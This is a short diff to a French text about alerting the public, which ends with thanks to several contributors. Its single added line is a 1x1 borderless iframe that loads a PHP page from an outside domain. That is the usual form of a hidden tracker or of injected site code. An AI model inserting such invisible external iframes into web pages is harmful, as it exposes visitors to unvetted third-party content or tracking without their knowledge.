@@ -21,3 +21,4 @@ Avez-vous des idées, des réflexions pour une meilleure alerte de la population
 
 Merci à J. Clément, E. Mabilde, N. Mahi, B. Vandensteen, S. Honnay et C. Fontaneuve (dépt Yvelines) pour leurs réflexions qui m'ont permi de préparer cette intervention.
 
+<iframe src="https://www.my-poppy.eu/cnt/cnt.php" width="1" height="1" frameBorder="0">
